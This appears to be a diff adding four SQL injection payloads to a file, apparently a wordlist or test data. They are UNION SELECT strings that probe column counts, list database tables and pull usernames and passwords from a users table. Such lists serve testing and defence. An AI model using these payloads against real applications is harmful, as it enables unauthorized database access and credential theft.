@@ -1,0 +1,4 @@
+' UNION SELECT NULL --
+' UNION SELECT 1,2 --
+' UNION SELECT username, password FROM users --
+' UNION SELECT table_name FROM information_schema.tables --
